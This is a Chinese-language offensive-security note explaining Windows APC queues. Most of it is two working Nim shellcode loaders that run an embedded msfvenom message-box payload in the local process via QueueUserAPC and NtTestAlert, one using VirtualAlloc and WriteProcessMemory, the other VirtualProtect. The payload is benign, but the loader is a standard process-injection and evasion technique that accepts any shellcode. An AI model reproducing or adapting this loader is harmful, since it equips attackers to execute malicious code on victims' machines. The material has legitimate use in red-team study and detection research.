# Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert
## APC队列
异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I/O 操作。

APC 队列包含两种类型的 APC：

内核模式 APC：由内核代码发起，通常用于处理内核级别的异步操作，如异步 I/O 完成。
用户模式 APC：由用户代码发起，允许用户态应用程序将特定函数插入到线程的 APC 队列中，以便在线程上下文中异步执行
## poc.nim
```
import winim

proc myThread(shellcode: openArray[byte]) =
    #加载的模块的名称 (.dll或.exe文件) 。 如果省略文件扩展名，则会追加默认扩展名.dll。
    #获取模块句柄
    var ntdllModule = GetModuleHandleA("ntdll.dll") 
    #从指定的动态链接库 (DLL) 检索导出函数或变量。
    var testAlert = GetProcAddress(ntdllModule, "NtTestAlert")
    #检索当前进程的伪句柄。
    let pHandle = GetCurrentProcess()    
    #分配内存
    var shellAddress = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    #将数据写入指定进程中的内存区域。
    WriteProcessMemory(pHandle, shellAddress, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), NULL)
    
    #将执行shellcode的任务添加到指定线程的 APC 队列。    
    QueueUserAPC(cast[PAPCFUNC](shellAddress), GetCurrentThread(), cast[ULONG_PTR](NULL))
    #调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）
    let f = cast[proc(){.nimcall.}](testAlert)
    f()

when defined(windows):
    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]

        # This is essentially the equivalent of 'if __name__ == '__main__' in python
        when isMainModule:
            myThread(shellcode)
```
或者
```
import winim

proc myThread(shellcode: openArray[byte]) =
    #加载的模块的名称 (.dll或.exe文件) 。 如果省略文件扩展名，则会追加默认库扩展名.dll。
    #获取模块句柄
    var ntdllModule = GetModuleHandleA("ntdll.dll") 
    #从指定的动态链接库 (DLL) 检索导出函数或变量。
    var testAlert = GetProcAddress(ntdllModule, "NtTestAlert")
    #更改shellcode所在内存的访问保护属性，允许执行
    var oldProtect: DWORD 
    VirtualProtect(unsafeAddr shellcode, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READWRITE, &oldProtect)
    
    #将执行shellcode的骚操作添加到指定线程的 APC 队列。    
    QueueUserAPC(cast[PAPCFUNC](unsafeAddr shellcode), GetCurrentThread(), cast[ULONG_PTR](NULL))
    #调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）
    let f = cast[proc(){.nimcall.}](testAlert)
    f()

when defined(windows):
    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]

        # This is essentially the equivalent of 'if __name__ == '__main__' in python
        when isMainModule:
            myThread(shellcode)
```
## 引用
```
https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert

https://www.cnblogs.com/henry666/p/17429771.html
```